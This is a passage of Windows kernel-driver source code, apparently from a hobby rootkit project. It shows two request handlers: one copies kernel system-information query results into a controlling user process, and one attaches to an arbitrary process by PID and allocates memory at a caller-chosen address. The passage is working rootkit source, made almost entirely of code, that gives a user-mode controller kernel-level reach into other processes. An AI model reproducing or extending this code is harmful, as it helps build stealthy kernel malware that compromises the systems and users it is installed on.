	DbgPrintEx(0, 0, "KMDFdriver CALLING PART1 SYSTEMINFO REQUEST\n");

	PEPROCESS Process = { 0 };
	RKSYSTEM_INFORET SysInfoRet = { 0 };
	KAPC_STATE PrcState = { 0 };
	RKSYSTEM_INFORMATION_CLASS CurrInf = { SystemBasicInformation, NULL, ROOTKSTATUS_QUERYSYSINFO, NULL };
	ULONG64 TotalRequests = strlen(RootkInst->MdlName);
	SIZE_T InfoSize = 0;
	ULONG64 InfoOffs = 0;
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	PVOID LocalSysinf = NULL;
	PVOID PrcInf = NULL;

	// Check for invalid arguments -
	if (RootkInst->MainPID == 0 || RootkInst->Buffer == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - INVALID PID OF MainMedium.exe (%hu)/ ATTRIBUTE BUFFER = NULL\n", RootkInst->MainPID);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Process EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - CANNOT GET EPROCESS (%hu) :(\n", RootkInst->MainPID);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check for KM address (not allowed for this function) -
	if ((ULONG64)RootkInst->Buffer >= general::GetHighestUserModeAddrADD()) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - ATTRIBUTE BUFFER ADDRESS IS IN SYSTEMSPACE (%p)\n", RootkInst->Buffer);
		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Iterate through the system info requests for part 1 (get each infotype from types buffer, query for system information and save the results in the original buffer) -
	for (ULONG64 AttrOffs = 0; AttrOffs < TotalRequests * sizeof(CurrInf); AttrOffs += sizeof(CurrInf)) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST NUMBER %llu:\n", AttrOffs / sizeof(CurrInf));
		status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - UserToKernelMEM DID NOT SUCCEED (CANNOT DISPLAY INFOTYPE - COULD NOT RECEIVE IT)\n", AttrOffs / sizeof(CurrInf));
			CurrInf.InfoSize = 0;
			CurrInf.PoolBuffer = NULL;
			CurrInf.ReturnStatus = ROOTKSTATUS_COPYFAIL;
		}
		else {
			DbgPrintEx(0, 0, "REQUEST NUMBER %llu UPDATE - UserToKernelMEM SUCCEEDED, QUERYING FOR SYSTEM INFORMATION (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
			SysInfoRet = requests::RequestSystemInfoADD(CurrInf.InfoType, (ULONG64)CurrInf.ReturnStatus, (DWORD)(AttrOffs / sizeof(CurrInf) + 1));
			CurrInf.PoolBuffer = SysInfoRet.Buffer;  // NULL = function failed, non-NULL = function succeeded
			CurrInf.InfoSize = (ULONG)SysInfoRet.BufferSize;  // 0 = function failed, >0 = function succeeded

			if (SysInfoRet.Buffer == NULL && SysInfoRet.BufferSize == 0) {
				DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - RequestSystemInfoADD DID NOT SUCCEED (RETURNED A NULL POOL POINTER, INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
				CurrInf.ReturnStatus = ROOTKSTATUS_QUERYSYSINFO;
			}
			else {
				DbgPrintEx(0, 0, "REQUEST NUMBER %llu SUCCESS - RequestSystemInfoADD SUCCEEDED (POOLBUFFER = %p, INFOSIZE = %llu, INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), SysInfoRet.Buffer, SysInfoRet.BufferSize, (ULONG64)CurrInf.InfoType);
				CurrInf.ReturnStatus = ROOTKSTATUS_SUCCESS;
				InfoSize += CurrInf.InfoSize;
			}
		}
		status = KernelToUserMEM(Process, &CurrInf, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), sizeof(CurrInf), FALSE);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FINAL UPDATE - KernelToUserMEM FAILED TO RETURN RKSYSTEM_INFORMATION_CLASS FOR THE REQUEST (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
		}
		else {
			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FINAL UPDATE - KernelToUserMEM SUCCEEDED TO RETURN RKSYSTEM_INFORMATION_CLASS FOR THE REQUEST (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
		}
	}


	// Allocate local system info buffer -
	LocalSysinf = ExAllocatePoolWithTag(NonPagedPool, InfoSize, 0x9f9f9ff9);
	if (!LocalSysinf) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - CANNOT ALLOCATE BUFFER FOR LOCAL SYSINFO (INFOSIZE = %zu) :(\n", InfoSize);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Allocate system info buffer in process -
	KeStackAttachProcess(Process, &PrcState);
	PrcInf = general::AllocateMemoryADD(NULL, ((InfoSize / PAGE_SIZE) + 1) * PAGE_SIZE, &PrcState, 0);
	if (PrcInf == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - CANNOT ALLOCATE BUFFER IN PROCESS FOR SYSINFO :(\n");
		ExFreePool(LocalSysinf);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Iterate through the system info requests from part 1 to copy all the information into one local buffer -
	for (ULONG64 AttrOffs = 0; AttrOffs < TotalRequests * sizeof(CurrInf); AttrOffs += sizeof(CurrInf)) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION AFTER PART 1 REQUEST NUMBER %llu:\n", AttrOffs / sizeof(CurrInf));
		status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - UserToKernelMEM DID NOT SUCCEED (CANNOT DISPLAY INFOTYPE - COULD NOT RECEIVE IT)\n", AttrOffs / sizeof(CurrInf));
		}
		else {
			DbgPrintEx(0, 0, "REQUEST NUMBER %llu UPDATE - UserToKernelMEM SUCCEEDED, QUERYING FOR SYSTEM INFORMATION (INFOTYPE = %llu)\n", AttrOffs / sizeof(CurrInf), (ULONG64)CurrInf.InfoType);
			if (CurrInf.PoolBuffer == NULL || CurrInf.InfoSize == 0) {
				DbgPrintEx(0, 0, "REQUEST NUMBER %llu FAILED - PART 1 DID NOT SUCCEED (SIZE = 0 / BUFFER = NULL)\n", AttrOffs / sizeof(CurrInf));
			}
			else {
				DbgPrintEx(0, 0, "REQUEST NUMBER %llu SUCCESS - PART 1 DID SUCCEEDED (SIZE = %zu / BUFFER = %p)\n", AttrOffs / sizeof(CurrInf), (SIZE_T)CurrInf.InfoSize, CurrInf.PoolBuffer);
				RtlCopyMemory((PVOID)((ULONG64)LocalSysinf + InfoOffs), CurrInf.PoolBuffer, CurrInf.InfoSize);
				InfoOffs += CurrInf.InfoSize;
			}
		}
	}


	// Copy the system information from local KM buffer into a UM buffer (part 2) -
	status = KernelToUserMEM(Process, LocalSysinf, PrcInf, InfoSize, FALSE);
	ExFreePool(LocalSysinf);

	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST FAILED - KernelToUserMEM FAILED TO RETURN SYSTEM INFORMATION BUFFER\n");
		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_COPYFAIL, STATUS_SUCCESS, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver CALLING SYSTEM INFORMATION REQUEST SUCCESS - KernelToUserMEM SUCCEEDED TO RETURN SYSTEM INFORMATION BUFFER\n");
	RootkInst->Out = PrcInf;
	RootkInst->Size = InfoSize;
	return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST\n");

	PEPROCESS Process = { 0 };
	KAPC_STATE PrcState = { 0 };
	MEMORY_BASIC_INFORMATION mbi = { 0 };

	PVOID InitialAddress = RootkInst->Buffer;
	ULONG64 RequestedSize = RootkInst->Size;
	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
	SIZE_T AllocSize = ((RequestedSize / PAGE_SIZE) + 1) * PAGE_SIZE;

	// Check for invalid arguments -
	if (!InitialAddress || !RequestedSize) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - INVALID ARGS SIZE (%zu)/INITIAL ADDRESS (%p)\n", RequestedSize, InitialAddress);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check for KM address (not allowed for this function) -
	if ((ULONG64)InitialAddress >= general::GetHighestUserModeAddrADD()) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - THE ADDRESS IS IN SYSTEMSPACE (%p)\n", InitialAddress);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Process EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT GET EPROCESS (%hu) :(\n", RootkInst->MainPID);
		return general::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
	}

	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST SOURCE (%s, %hu)\n", RootkInst->MdlName, RootkInst->MainPID);


	// Allocate the needed memory -
	KeStackAttachProcess(Process, &PrcState);  // attach to the process
	RootkInst->Out = general::AllocateMemoryADD(InitialAddress, AllocSize, &PrcState, ZeroBits);
	if (RootkInst->Out == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - ALLOCATION OF MEMORY FAILED :(\n");
		return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}

	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST SUCCESS (RANGE ALLIGNED TO %p FROM %p)\n", RootkInst->Out, InitialAddress);
	return general::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}